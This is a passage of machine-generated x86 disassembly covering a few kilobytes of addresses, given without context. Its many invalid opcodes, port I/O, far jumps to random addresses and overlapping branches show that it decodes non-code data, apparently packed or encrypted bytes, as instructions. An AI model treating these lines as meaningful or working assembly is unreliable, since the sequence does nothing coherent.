  41d823:	inc    esi
  41d824:	add    cl,0x6a
  41d827:	out    0xe5,al
  41d829:	rcl    bl,0xcf
  41d82c:	int    0x63
  41d82e:	mov    ecx,ds
  41d830:	xor    eax,0xffffffb7
  41d833:	gs sahf 
  41d835:	lea    ecx,[ecx-0x40dbd011]
  41d83b:	(bad)  
  41d83d:	shl    DWORD PTR [ebx*2+0x4e61c7f4],1
  41d844:	fdiv   DWORD PTR [edi+0x70]
  41d847:	or     esi,ecx
  41d849:	xchg   ah,bh
  41d84b:	jne    0x41d7f6
  41d84d:	popf   
  41d84e:	in     al,dx
  41d84f:	mov    ecx,0x6cf8e42
  41d854:	jecxz  0x41d880
  41d856:	jmp    0x44142880
  41d85b:	ret    
  41d85c:	push   ds
  41d85d:	inc    esi
  41d85e:	adc    DWORD PTR [esp+eax*8-0x57],ebp
  41d862:	daa    
  41d863:	push   0xdc823a75
  41d868:	jne    0x41d828
  41d86a:	or     dh,BYTE PTR [ebp+0x3d]
  41d86d:	pop    ds
  41d86e:	push   es
  41d86f:	and    BYTE PTR [edx+eax*8],ch
  41d872:	push   esp
  41d873:	fcom   QWORD PTR [ebx+eax*1-0x1f032c96]
  41d87a:	das    
  41d87b:	xchg   ebp,eax
  41d87c:	mov    esi,esi
  41d87e:	rol    DWORD PTR [ecx-0x28],cl
  41d881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d882:	imul   ecx,edx,0xb938a55f
  41d888:	in     eax,0x63
  41d88a:	lea    ecx,[ecx]
  41d88c:	jp     0x41d88c
  41d88e:	lahf   
  41d88f:	mov    al,BYTE PTR [edi-0x7ee50f57]
  41d895:	packssdw mm5,QWORD PTR ds:0xe14aa214
  41d89c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d89d:	loopne 0x41d88b
  41d89f:	jb     0x41d823
  41d8a1:	loop   0x41d852
  41d8a3:	mov    eax,ds:0x7d458f83
  41d8a8:	xor    DWORD PTR [ebx+0x325cfe66],esp
  41d8ae:	clc    
  41d8af:	retf   
  41d8b0:	pop    es
  41d8b1:	hlt    
  41d8b2:	dec    ebx
  41d8b3:	push   es
  41d8b4:	js     0x41d87c
  41d8b6:	push   es
  41d8b7:	and    DWORD PTR [ecx+0x2d],esp
  41d8ba:	xor    eax,0xf8646798
  41d8bf:	jle    0x41d864
  41d8c1:	fist   WORD PTR [esi+0x16]
  41d8c4:	repz pop esi
  41d8c6:	sub    DWORD PTR [ebx-0x8d10ecb],ebx
  41d8cc:	xor    ch,cl
  41d8ce:	lods   al,BYTE PTR ds:[esi]
  41d8cf:	rcr    DWORD PTR [ebx+0x7d],cl
  41d8d2:	adc    al,0xa6
  41d8d4:	xchg   DWORD PTR [eax],edx
  41d8d6:	xchg   edx,eax
  41d8d7:	push   ss
  41d8d8:	call   0xe010b23b
  41d8dd:	and    bh,dl
  41d8df:	call   0x425dbedb
  41d8e4:	sbb    BYTE PTR [edi+ebx*4],dl
  41d8e7:	clc    
  41d8e8:	pushf  
  41d8e9:	and    eax,0xc680c30a
  41d8ee:	sub    BYTE PTR [ecx+0x6c],bl
  41d8f1:	inc    ebp
  41d8f2:	(bad)  
  41d8f3:	mov    edx,0xdb419f7d
  41d8f8:	or     ecx,DWORD PTR [esi-0x7d7d99b1]
  41d8fe:	das    
  41d8ff:	fisubr DWORD PTR [edi+ecx*1]
  41d902:	in     al,dx
  41d903:	and    cl,al
  41d905:	dec    ebp
  41d906:	repnz inc ecx
  41d908:	fistp  DWORD PTR [ecx-0x1b8e92]
  41d90e:	ret    
  41d90f:	fcom   DWORD PTR [edi]
  41d911:	add    al,BYTE PTR [edx-0x5a]
  41d914:	pop    esp
  41d915:	xor    BYTE PTR ds:0x202949ba,al
  41d91b:	sub    BYTE PTR [edx-0x44],bl
  41d91e:	mov    eax,0xf15f2351
  41d923:	shl    DWORD PTR [ecx+0x59],cl
  41d926:	adc    al,0x7d
  41d928:	cdq    
  41d929:	adc    esp,edx
  41d92b:	or     BYTE PTR [ebp+0x3c5fe815],ah
  41d931:	clc    
  41d932:	sub    al,0xe
  41d934:	adc    eax,0xf00d11c1
  41d939:	jge    0x41d98d
  41d93b:	add    DWORD PTR [ecx-0x48],0xffffffaa
  41d93f:	iret   
  41d940:	sub    al,0xfb
  41d942:	jmp    0x3e48:0xddb9cf60
  41d949:	sbb    BYTE PTR [eax+0x4a],0x9
  41d94d:	(bad)
  41d950:	pusha  
  41d951:	mov    ch,0x50
  41d953:	div    BYTE PTR [esi-0x58]
  41d956:	sbb    al,0xd4
  41d958:	jae    0x41d947
  41d95a:	sbb    eax,0x1229fc37
  41d95f:	xor    DWORD PTR [ecx+0x45d6fd3d],ebp
  41d965:	mov    ds:0x42ecb5ca,eax
  41d96a:	sbb    DWORD PTR [ecx+edx*8],ebp
  41d96d:	fs stos BYTE PTR es:[edi],al
  41d96f:	push   cs
  41d970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d971:	ret    0x76ff
  41d974:	cmp    eax,DWORD PTR [esi-0x10]
  41d977:	ds cli 
  41d979:	shl    BYTE PTR [ebx-0x267843f7],0x59
  41d980:	(bad)  
  41d981:	pop    esp
  41d982:	and    eax,0x798e6f93
  41d987:	fldenv [edx+0x2034e28]
  41d98d:	dec    ecx
  41d98e:	lods   eax,DWORD PTR ds:[esi]
  41d98f:	loope  0x41d9ae
  41d991:	xchg   esp,eax
  41d992:	ror    ebp,0xfb
  41d995:	fst    QWORD PTR [edx]
  41d997:	mov    bh,BYTE PTR [edx+0x21]
  41d99a:	scas   eax,DWORD PTR es:[edi]
  41d99b:	jno    0x41d9db
  41d99d:	shl    ebp,1
  41d99f:	ins    DWORD PTR es:[edi],dx
  41d9a0:	add    eax,eax
  41d9a2:	jmp    0xc884:0xaee147be
  41d9a9:	fistp  DWORD PTR ds:0x54e40f34
  41d9af:	fmul   st(2),st
  41d9b1:	in     eax,dx
  41d9b2:	clc    
  41d9b3:	cmp    eax,DWORD PTR [edi+0x7645d41d]
  41d9b9:	mov    esi,0x4d94e315
  41d9be:	cmp    dh,BYTE PTR [esi+ecx*8+0xc11514]
  41d9c5:	bound  ebp,QWORD PTR [ebp+0x33]
  41d9c8:	xchg   ecx,eax
  41d9c9:	in     al,0xf8
  41d9cb:	out    dx,al
  41d9cc:	into   
  41d9cd:	push   esp
  41d9ce:	stc    
  41d9cf:	fisub  DWORD PTR [edi+0x34]
  41d9d2:	and    BYTE PTR [eax+0x45],ah
  41d9d5:	mov    al,0x97
  41d9d7:	mov    eax,ds:0x294e5eb9
  41d9dc:	fucomip st,st(7)
  41d9de:	je     0x41d9b5
  41d9e0:	les    esi,FWORD PTR [eax+0x5c]
  41d9e3:	inc    esp
  41d9e4:	(bad)  
  41d9e5:	add    al,BYTE PTR gs:[edi]
  41d9e8:	dec    ecx
  41d9e9:	js     0x41da37
  41d9eb:	mov    ecx,0xab1da6f1
  41d9f0:	mov    dl,0xaa
  41d9f2:	lock mov bh,BYTE PTR es:[ebx-0x6a33c64d]
  41d9fa:	push   edx
  41d9fb:	test   al,0x7c
  41d9fd:	clc    
  41d9fe:	es mov al,0x7f
  41da01:	lea    ebx,[ebp+0x368520e5]
  41da07:	jmp    DWORD PTR [ecx+0x74719f8b]
  41da0d:	imul   esi,DWORD PTR [ebx+0x44],0xffffffdb
  41da11:	mov    al,0xd
  41da13:	test   esp,ebx
  41da15:	cwde   
  41da16:	lds    esi,FWORD PTR [ebp-0x78]
  41da19:	aas    
  41da1a:	std    
  41da1b:	repnz mov al,ds:0x24519da9
  41da21:	and    al,0xfe
  41da23:	pop    ebp
  41da24:	out    dx,eax
  41da25:	(bad)  
  41da26:	scas   al,BYTE PTR es:[edi]
  41da27:	addr16 icebp 
  41da29:	sbb    ecx,esp
  41da2b:	lea    ebx,[ebp+0x33]
  41da2e:	and    ebx,ebp
  41da30:	pusha  
  41da31:	int    0x4b
  41da33:	pop    ecx
  41da34:	sbb    ch,dh
  41da36:	xchg   ebx,eax
  41da37:	fadd   QWORD PTR [ebx+0x3dc3cb07]
  41da3d:	xchg   ecx,eax
  41da3e:	ds dec esp
  41da40:	outs   dx,DWORD PTR ds:[esi]
  41da41:	mov    ebp,edx
  41da43:	push   esi
  41da44:	xchg   edx,eax
  41da45:	cli    
  41da46:	pop    edi
  41da47:	cdq    
  41da48:	dec    esp
  41da49:	sti    
  41da4a:	stc    
  41da4b:	cmp    bl,dh
  41da4d:	stc    
  41da4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da4f:	fnstcw WORD PTR [ebp-0x48d9209b]
  41da55:	lock mov ebp,0x63ec16b4
  41da5b:	jno    0x41da8d
  41da5d:	retf   
  41da5e:	pop    ds
  41da5f:	inc    ecx
  41da60:	cli    
  41da61:	aam    0x8f
  41da63:	ror    BYTE PTR [ebx+esi*4-0x49],cl
  41da67:	xor    BYTE PTR [edi-0x1f],0xc1
  41da6b:	sar    DWORD PTR [ecx+0x45],0xce
  41da6f:	imul   esp,DWORD PTR [edx],0x24
  41da72:	outs   dx,BYTE PTR ds:[esi]
  41da73:	addr16 push es
  41da75:	xor    dh,bh
  41da77:	pop    edi
  41da78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da79:	pop    ds
  41da7a:	leave  
  41da7b:	pop    ecx
  41da7c:	ss ret 0x5530
  41da80:	jmp    0x7cf62503
  41da85:	adc    al,0x65
  41da87:	test   eax,0xa64f618c
  41da8c:	xchg   esp,eax
  41da8d:	data16 jmp 0x41da55
  41da90:	sbb    ebp,edi
  41da92:	iret   
  41da93:	(bad)  
  41da94:	mov    esp,0xcb72fa78
  41da99:	retf   0xdb82
  41da9c:	test   BYTE PTR [esi],0xd0
  41da9f:	jmp    0x4a2a198b
  41daa4:	xchg   ebx,eax
  41daa5:	lods   eax,DWORD PTR ds:[esi]
  41daa6:	sbb    al,bh
  41daa8:	mov    eax,ds:0x2efa4b0e
  41daad:	rcr    BYTE PTR [eax+ebx*2+0x1e],0xb1
  41dab2:	pop    eax
  41dab3:	gs pop ebx
  41dab5:	pop    edi
  41dab6:	loope  0x41daed
  41dab8:	test   DWORD PTR [esi+edx*2+0x29],0x55b6cb4d
  41dac0:	dec    edi
  41dac1:	push   ecx
  41dac2:	jns    0x41da84
  41dac4:	fmul   QWORD PTR [esi+0x53f8c471]
  41daca:	push   ebx
  41dacb:	sti    
  41dacc:	repz arpl WORD PTR [ecx+0x8],bx
  41dad0:	xchg   DWORD PTR [eax-0x3ad20b3f],esi
  41dad6:	jecxz  0x41dab0
  41dad8:	cmp    al,0x6d
  41dada:	(bad)  
  41dadb:	jae    0x41db2d
  41dadd:	arpl   WORD PTR [edi-0x14],sp
  41dae0:	arpl   WORD PTR [di],ax
  41dae3:	and    BYTE PTR [edx-0x3a],cl
  41dae6:	(bad)  
  41dae7:	dec    eax
  41dae8:	dec    ebx
  41dae9:	pop    edx
  41daea:	xlat   BYTE PTR ds:[ebx]
  41daeb:	aaa    
  41daec:	inc    ebx
  41daed:	mov    edx,0x5429e06
  41daf2:	xor    eax,0xaeb3f03e
  41daf7:	jmp    DWORD PTR [ebx+edx*2+0x16]
  41dafb:	push   esp
  41dafc:	ins    DWORD PTR es:[edi],dx
  41dafd:	xchg   edx,eax
  41dafe:	jo     0x41da92
  41db00:	sbb    al,0x78
  41db02:	or     al,0x7
  41db04:	xor    ebx,DWORD PTR [edi]
  41db06:	push   edx
  41db07:	push   0x43
  41db09:	fnsave ds:0x7e8c4a1e
  41db0f:	shr    BYTE PTR [eax],cl
  41db11:	scas   al,BYTE PTR es:[edi]
  41db12:	ror    BYTE PTR [eax+0x78],1
  41db15:	cmp    BYTE PTR [ebx+0x5050ac19],ah
  41db1b:	sbb    eax,DWORD PTR [ecx-0x30d74311]
  41db21:	sub    ebx,DWORD PTR [eax+0xfa8a016]
  41db27:	xor    al,0xce
  41db29:	jo     0x41db25
  41db2b:	mov    esp,0xbd302e32
  41db30:	test   DWORD PTR [ecx-0x4ddfbc9c],0x4af2826e
  41db3a:	xchg   esi,eax
  41db3b:	(bad)  
  41db3c:	in     al,dx
  41db3d:	mov    dl,0xc8
  41db3f:	push   esi
  41db40:	xor    dh,bh
  41db42:	es adc eax,0x28cfba27
  41db48:	mov    esp,0x8e0896c0
  41db4d:	out    dx,eax
  41db4e:	sahf   
  41db4f:	pop    ss
  41db50:	xchg   DWORD PTR [edx],esp
  41db52:	mov    ds:0x36780356,eax
  41db57:	jne    0x41dbcb
  41db59:	enter  0x8b3e,0x61
  41db5d:	cli    
  41db5e:	cmp    al,ch
  41db60:	xor    cl,ch
  41db62:	push   edi
  41db63:	(bad)  
  41db64:	jle    0x41db0b
  41db66:	cmp    bl,0x20
  41db69:	add    eax,DWORD PTR [esi-0x23b4abaa]
  41db6f:	inc    ebx
  41db70:	stc    
  41db71:	ds retf 
  41db73:	pop    es
  41db74:	ja     0x41db3f
  41db76:	sub    esp,DWORD PTR [eax-0x7a7e0e3]
  41db7c:	clc    
  41db7d:	(bad)  
  41db7e:	and    al,cl
  41db80:	sub    bl,BYTE PTR ds:0x11bffdc
  41db86:	repz or ch,BYTE PTR [ebp+0x3b922384]
  41db8d:	inc    edx
  41db8e:	dec    ebx
  41db8f:	and    al,0x73
  41db91:	fwait
  41db92:	xor    al,0xab
  41db94:	xor    al,0x15
  41db96:	ret    0xa3e4
  41db99:	mov    ds:0x7c289236,al
  41db9e:	sub    DWORD PTR [edi],edi
  41dba0:	adc    BYTE PTR [esi+0x100ee40],bh
  41dba6:	jbe    0x41db5e
  41dba8:	add    ebx,DWORD PTR [esi+edx*8-0x74]
  41dbac:	push   0x18adbdf2
  41dbb1:	sbb    DWORD PTR [ebp-0x2e],eax
  41dbb4:	xor    BYTE PTR ds:[eax],al
  41dbb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb8:	mov    DWORD PTR [eax-0x34],edi
  41dbbb:	lds    eax,FWORD PTR [ecx]
  41dbbd:	or     dh,BYTE PTR [eax]
  41dbbf:	add    al,0xaa
  41dbc1:	xlat   BYTE PTR ds:[ebx]
  41dbc2:	pop    edi
  41dbc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbc4:	outs   dx,DWORD PTR ds:[esi]
  41dbc5:	dec    esi
  41dbc6:	jne    0x41dbef
  41dbc8:	data16 fidivr DWORD PTR [ecx+0x74706a4c]
  41dbcf:	iret   
  41dbd0:	fmul   st(1),st
  41dbd2:	push   eax
  41dbd3:	jb     0x41dbd7
  41dbd5:	jp     0x41dbc3
  41dbd7:	ret    0x6ae2
  41dbda:	pop    edi
  41dbdb:	mov    gs,eax
  41dbdd:	sub    al,0xd3
  41dbdf:	pusha  
  41dbe0:	xchg   edi,eax
  41dbe1:	loope  0x41db9a
  41dbe3:	rol    DWORD PTR [edi+0x3b5b0231],cl
  41dbe9:	cmp    BYTE PTR [ecx+0x16],cl
  41dbec:	js     0x41dc0b
  41dbee:	xchg   ebp,eax
  41dbef:	xor    BYTE PTR [eax],cl
  41dbf1:	sbb    al,BYTE PTR ds:0x64db3214
  41dbf7:	add    esp,edi
  41dbf9:	int3   
  41dbfa:	out    0x7b,al
  41dbfc:	sub    dh,bl
  41dbfe:	xchg   esi,eax
  41dbff:	aas    
  41dc00:	sti    
  41dc01:	scas   al,BYTE PTR es:[edi]
  41dc02:	mov    BYTE PTR [eax-0x224bc13c],ch
  41dc08:	and    cl,bh
  41dc0a:	mov    fs,WORD PTR [ecx+edx*8-0x3]
  41dc0e:	mov    ds:0xa8460f9a,eax
  41dc13:	mov    BYTE PTR [ebx+edi*8-0x75],ch
  41dc17:	scas   eax,DWORD PTR es:[edi]
  41dc18:	(bad)  
  41dc19:	sti    
  41dc1a:	sbb    DWORD PTR [ebx],ebx
  41dc1c:	dec    ebx
  41dc1d:	xchg   ebx,esp
  41dc1f:	ds inc edi
  41dc21:	mov    eax,0xe5a6a999
  41dc26:	fidiv  WORD PTR ds:0xf592e735
  41dc2c:	ror    BYTE PTR [eax],0xed
  41dc2f:	xchg   ebx,eax
  41dc30:	test   bh,0x6c
  41dc33:	xchg   esi,eax
  41dc34:	jecxz  0x41dbce
  41dc36:	in     eax,0x60
  41dc38:	mov    ds:0x58acc49e,ax
  41dc3e:	repz push eax
  41dc40:	fwait
  41dc41:	inc    eax
  41dc42:	mov    edi,DWORD PTR [edx]
  41dc44:	xor    edx,DWORD PTR [edx+0x61ae3c0f]
  41dc4a:	cli    
  41dc4b:	and    BYTE PTR [ecx],dl
  41dc4d:	iret   
  41dc4e:	push   ecx
  41dc4f:	sbb    DWORD PTR [ebp-0x56],esi
  41dc52:	jp     0x41dc81
  41dc54:	push   esp
  41dc55:	repz and eax,0x912704b1
  41dc5b:	inc    ebp
  41dc5c:	xchg   ebx,eax
  41dc5d:	pop    esp
  41dc5e:	push   ecx
  41dc5f:	dec    ebx
  41dc60:	leave  
  41dc61:	mov    dh,0xb2
  41dc63:	icebp  
  41dc64:	mov    cl,bh
  41dc66:	add    ebx,ebx
  41dc68:	jg     0x41dc7e
  41dc6a:	loop   0x41dc5e
  41dc6c:	aas    
  41dc6d:	std    
  41dc6e:	out    0x37,al
  41dc70:	jns    0x41dcb7
  41dc72:	jmp    FWORD PTR [ebx+edi*4-0x44]
  41dc76:	push   esp
  41dc77:	adc    eax,esi
  41dc79:	sub    ebx,ebx
  41dc7b:	scas   al,BYTE PTR es:[edi]
  41dc7c:	mov    ss,edx
  41dc7e:	pop    esp
  41dc7f:	aam    0x8f
  41dc81:	cmp    al,0xac
  41dc83:	je     0x41dcae
  41dc85:	add    al,0xf1
  41dc87:	fs pop ebx
  41dc89:	imul   edx,DWORD PTR [edx+0x4e7ecca3],0x5
  41dc90:	xor    al,0xed
  41dc92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc93:	push   es
  41dc94:	inc    eax
  41dc95:	je     0x41dccb
  41dc97:	fcom   QWORD PTR [edx-0x37f3f1f0]
  41dc9d:	push   eax
  41dc9e:	adc    bh,BYTE PTR [esi+ebx*1+0x332f89c9]
  41dca5:	sbb    DWORD PTR [edi+0x3f],edx
  41dca8:	sub    eax,DWORD PTR [ecx+0x6760a9f7]
  41dcae:	jne    0x41dd10
  41dcb0:	test   BYTE PTR [edx+eiz*2],dl
  41dcb3:	rol    BYTE PTR [esi],1
  41dcb5:	xor    DWORD PTR ds:[ebx+0x2b],ecx
  41dcb9:	xlat   BYTE PTR ds:[ebx]
  41dcba:	aad    0x84
  41dcbc:	add    edx,edx
  41dcbe:	in     al,dx
  41dcbf:	cmp    esi,ebp
  41dcc1:	cmp    al,0x51
  41dcc3:	adc    edi,esp
  41dcc5:	push   ebp
  41dcc6:	aas    
  41dcc7:	inc    esp
  41dcc8:	mov    bl,0xd5
  41dcca:	fidiv  WORD PTR [esi+ebx*2]
  41dccd:	adc    dl,ch
  41dccf:	je     0x41dd2a
  41dcd1:	loop   0x41dc9c
  41dcd3:	sub    dl,al
  41dcd5:	sub    al,0x65
  41dcd7:	cld    
  41dcd8:	test   BYTE PTR [ebp+0x6bcfcc48],0xb8
  41dcdf:	add    al,0x22
  41dce1:	push   eax
  41dce2:	pop    ecx
  41dce3:	add    BYTE PTR [edx],0x2e
  41dce6:	sti    
  41dce7:	push   0xbb3dee18
  41dcec:	push   ecx
  41dced:	push   es
  41dcee:	jmp    FWORD PTR [eax]
  41dcf0:	rol    DWORD PTR ds:0xbb935b99,cl
  41dcf6:	adc    DWORD PTR [edi-0x13],edi
  41dcf9:	jmp    0x41dd5b
  41dcfb:	jnp    0x41dd26
  41dcfd:	push   ebp
  41dcfe:	repnz add eax,0x1cc2e988
  41dd04:	(bad)  
  41dd05:	ficomp WORD PTR [edx-0x13]
  41dd08:	sar    DWORD PTR [ecx+0x31],0xce
  41dd0c:	sbb    DWORD PTR [ebx-0x1c1934d],0x55bac015
  41dd16:	inc    edi
  41dd17:	ins    DWORD PTR es:[edi],dx
  41dd18:	outs   dx,DWORD PTR ds:[esi]
  41dd19:	cmp    eax,DWORD PTR [esi-0x79]
  41dd1c:	imul   ebp,eax,0x7b39bd27
  41dd22:	hlt    
  41dd23:	push   bx
  41dd25:	push   ebp
  41dd26:	cmp    eax,0xf411de07
  41dd2b:	in     al,dx
  41dd2c:	and    DWORD PTR [ecx],0xf3b8398b
  41dd32:	push   ecx
  41dd33:	fcomp  QWORD PTR [edx]
  41dd35:	loope  0x41dd14
  41dd37:	test   BYTE PTR [edx],al
  41dd39:	dec    ebx
  41dd3a:	cli    
  41dd3b:	mov    ds:0x38712f22,eax
  41dd40:	cs das 
  41dd42:	push   0x1043ae99
  41dd47:	inc    ebp
  41dd48:	dec    ebx
  41dd49:	mov    esi,0x2fc4358c
  41dd4e:	imul   ecx,DWORD PTR [esi],0xffffffa9
  41dd51:	in     al,dx
  41dd52:	sbb    esp,edi
  41dd54:	mov    DWORD PTR [edi],ebx
  41dd56:	dec    ecx
  41dd57:	xchg   DWORD PTR [edx-0x569fc982],ebp
  41dd5d:	push   ds
  41dd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd5f:	mov    ds:0x1093055a,eax
  41dd64:	aas    
  41dd65:	pop    edi
  41dd66:	inc    ebx
  41dd67:	sbb    al,0x70
  41dd69:	out    dx,al
  41dd6a:	mov    cl,BYTE PTR [ecx+edi*8]
  41dd6d:	inc    edx
  41dd6e:	adc    eax,0x5bb87ad9
  41dd73:	jmp    0x2f84:0xe49173bc
  41dd7a:	jns    0x41dd18
  41dd7c:	out    0xec,al
  41dd7e:	dec    ecx
  41dd7f:	jmp    0x41ddc4
  41dd81:	pusha  
  41dd82:	arpl   WORD PTR [ebp+0x2fd8a055],dx
  41dd88:	add    al,BYTE PTR ds:0xf391132c
  41dd8e:	jno    0x41dd28
  41dd90:	dec    eax
  41dd91:	jae    0x41ddb3
  41dd93:	into   
  41dd94:	and    BYTE PTR [ebx+0x5c363d79],dh
  41dd9a:	clc    
  41dd9b:	(bad)  
  41dd9c:	je     0x41ddf5
  41dd9e:	out    0x89,al
  41dda0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda1:	in     eax,dx
  41dda2:	add    dl,bl
  41dda4:	xor    al,0x8c
  41dda6:	mov    ch,0x33
  41dda8:	mov    DWORD PTR [edi+eiz*2],ebx
  41ddab:	(bad)  
  41ddad:	ins    BYTE PTR es:[edi],dx
  41ddae:	pop    edx
  41ddaf:	hlt    
  41ddb0:	dec    esp
  41ddb1:	scas   al,BYTE PTR es:[edi]
  41ddb2:	les    ebp,FWORD PTR [edi+0x6a]
  41ddb5:	jmp    0x41dd62
  41ddb7:	sbb    bl,BYTE PTR [ecx]
  41ddb9:	xor    ecx,DWORD PTR [edi-0xe]
  41ddbc:	adc    dh,BYTE PTR [esi+0x2a]
  41ddbf:	xchg   ebp,eax
  41ddc0:	pop    edi
  41ddc1:	not    DWORD PTR [ecx+0x6e4703b0]
  41ddc7:	(bad)  
  41ddc9:	jge    0x41dd95
  41ddcb:	push   0x74
  41ddcd:	stos   DWORD PTR es:[edi],eax
  41ddce:	in     eax,0x9e
  41ddd0:	push   ebx
  41ddd1:	mov    eax,ds:0x276657f7
  41ddd6:	xor    eax,0x1c05fc17
  41dddb:	lods   al,BYTE PTR ds:[esi]
  41dddc:	xchg   esi,eax
  41dddd:	test   DWORD PTR [esi-0x16],esp
  41dde0:	push   0x41664c1e
  41dde5:	adc    ah,BYTE PTR [edi]
  41dde7:	sbb    ecx,DWORD PTR [edi+eax*4+0x38800d90]
  41ddee:	in     eax,0xc5
  41ddf0:	frstor [ebx+eiz*4-0x53]
  41ddf4:	pop    ecx
  41ddf5:	adc    al,0x81
  41ddf7:	sub    bl,BYTE PTR [edi+0x451d8799]
  41ddfd:	addps  xmm4,xmm5
  41de00:	enter  0xd4e9,0xba
  41de04:	bound  ecx,QWORD PTR fs:[ebx-0x52]
  41de08:	push   0xba552254
  41de0d:	jecxz  0x41ddcb
  41de0f:	mov    cl,BYTE PTR [edi-0x6b]
  41de12:	int    0x7b
  41de14:	iret   
  41de15:	sahf   
  41de16:	test   DWORD PTR [eax-0x5c114585],ecx
  41de1c:	popf   
  41de1d:	add    al,0xe9
  41de1f:	int3   
  41de20:	dec    edi
  41de21:	dec    esp
  41de22:	fisttp QWORD PTR [ebp-0x80]
  41de25:	stos   BYTE PTR es:[edi],al
  41de26:	ds mov ebx,0x76cea96b
  41de2c:	in     eax,dx
  41de2d:	adc    eax,0xf59fe6
  41de32:	push   ebp
  41de33:	arpl   WORD PTR [ecx+0x4a66e39c],bx
  41de39:	test   ebp,esp
  41de3b:	sub    DWORD PTR [eax+0x55b2b178],edx
  41de41:	and    BYTE PTR [ebx-0x5a80fead],0x34
  41de48:	sbb    esp,DWORD PTR [esi]
  41de4a:	adc    al,0xea
  41de4c:	xchg   esp,eax
  41de4d:	push   edx
  41de4e:	and    bl,BYTE PTR [esi+0x7e9a921f]
  41de54:	jns    0x41de01
  41de56:	pop    edi
  41de57:	cwde   
  41de58:	int    0x8
  41de5a:	std    
  41de5b:	jae    0x41de4e
  41de5d:	das    
  41de5e:	enter  0xd8e8,0xb6
  41de62:	(bad)  
  41de63:	pop    eax
  41de64:	or     eax,0xf2260c1a
  41de69:	clc    
  41de6a:	mov    WORD PTR [ebx+0x4628c1c0],es
  41de70:	or     al,0x7a
  41de72:	add    ecx,DWORD PTR [edx]
  41de74:	outs   dx,DWORD PTR ds:[esi]
  41de75:	add    esp,ecx
  41de77:	pop    edx
  41de78:	test   eax,0x7f3497bf
  41de7d:	jecxz  0x41de2e
  41de7f:	ins    DWORD PTR es:[edi],dx
  41de80:	xor    DWORD PTR [edx],edx
  41de82:	xchg   DWORD PTR [ebx+0x3],edi
  41de85:	mov    ds:0x5f3691a0,eax
  41de8a:	imul   ebx,DWORD PTR [eax+0x33],0x4c
  41de8e:	fdivrp st(1),st
  41de90:	test   DWORD PTR [edx+0x78],eax
  41de93:	lahf   
  41de94:	loop   0x41de76
  41de96:	pushf  
  41de97:	and    BYTE PTR [eax+0x240e1cd8],dl
  41de9d:	pusha  
  41de9e:	push   ebx
  41de9f:	(bad)  
  41dea0:	mov    ah,0x60
  41dea2:	fdivr  st,st(0)
  41dea4:	imul   ecx,DWORD PTR [esi+0x7f],0xe36adce
  41deab:	adc    eax,DWORD PTR [ebx+0x3c]
  41deae:	inc    ebx
  41deaf:	std    
  41deb0:	mov    esp,0x3ac11af9
  41deb5:	add    al,0x6b
  41deb7:	cdq    
  41deb8:	mov    ch,0x99
  41deba:	xor    BYTE PTR [ebp-0x36bbed10],ah
  41dec0:	pop    ebx
  41dec1:	xchg   esi,eax
  41dec2:	jg     0x41dee3
  41dec4:	(bad)  
  41dec5:	into   
  41dec6:	(bad)  
  41dec7:	adc    eax,0xe150f190
  41decc:	dec    ecx
  41decd:	push   ebp
  41dece:	add    BYTE PTR [ecx-0x3dd6c0d0],0x18
  41ded5:	add    BYTE PTR [ebx-0x17189b88],0x2
  41dedc:	jb     0x41df4c
  41dede:	(bad)  
  41dedf:	clc    
  41dee0:	test   BYTE PTR [eax-0x2a],dl
  41dee3:	outs   dx,DWORD PTR ds:[esi]
  41dee4:	cmp    al,0x95
  41dee6:	test   BYTE PTR [ebx],al
  41dee8:	dec    esp
  41dee9:	data16 icebp 
  41deeb:	jns    0x41decf
  41deed:	dec    ebp
  41deee:	test   eax,0x6b22be31
  41def3:	mov    eax,ds:0x7fb6d160
  41def8:	sbb    ch,BYTE PTR [ecx+0x7afb91db]
  41defe:	mov    BYTE PTR [eax-0x1a],0x5
  41df02:	push   edx
  41df03:	ds xchg ebp,eax
  41df05:	fstp   st(6)
  41df07:	(bad)  
  41df08:	adc    bl,ch
  41df0a:	mov    ss,WORD PTR [esp+edx*1-0x74]
  41df0e:	mov    ch,0x1c
  41df10:	jae    0x41df1a
  41df12:	mov    ds:0x9113172d,al
  41df17:	aas    
  41df18:	mov    ch,bh
  41df1a:	jne    0x41deb9
  41df1c:	loop   0x41df1c
  41df1e:	stos   DWORD PTR es:[edi],eax
  41df1f:	sti    
  41df20:	jmp    0x41dedf
  41df22:	push   0x8
  41df24:	stc    
  41df25:	mov    bl,0xf
  41df27:	push   cs
  41df28:	je     0x41defe
  41df2a:	adc    ebp,0xf2df9cd9
  41df30:	mov    edx,DWORD PTR [ecx-0x3c7dd1bd]
  41df36:	sbb    BYTE PTR [eax+0x77b1c772],cl
  41df3c:	inc    edi
  41df3d:	cmp    eax,0xdca40ab4
  41df42:	pop    es
  41df43:	jns    0x41df90
  41df45:	cli    
  41df46:	push   0x83e86ba6
  41df4b:	std    
  41df4c:	jp     0x41df64
  41df4e:	ror    ch,1
  41df50:	ss lahf 
  41df52:	sbb    eax,0x5026409b
  41df57:	sti    
  41df58:	in     al,dx
  41df59:	adc    bl,BYTE PTR [eax]
  41df5b:	iret   
  41df5c:	and    BYTE PTR [esp+ebp*8-0x7222c6bd],dh
  41df63:	js     0x41df78
  41df65:	cmp    ebp,DWORD PTR ds:0x5d171b41
  41df6b:	sbb    ebp,DWORD PTR [eax]
  41df6d:	mov    DWORD PTR [edx],ebx
  41df6f:	mov    edi,0xb86b9717
  41df74:	sbb    BYTE PTR [ebp+0x2],dl
  41df77:	icebp  
  41df78:	scas   al,BYTE PTR es:[edi]
  41df79:	mov    esi,0xb4154ddf
  41df7e:	mov    es,ecx
  41df80:	adc    BYTE PTR [edx],ch
  41df82:	hlt    
  41df83:	cmp    al,0x7d
  41df85:	xlat   BYTE PTR ds:[ebx]
  41df86:	and    BYTE PTR [esi-0x59],cl
  41df89:	mov    BYTE PTR [ebx+0x2c474983],cl
  41df8f:	or     al,0xf0
  41df91:	cmc    
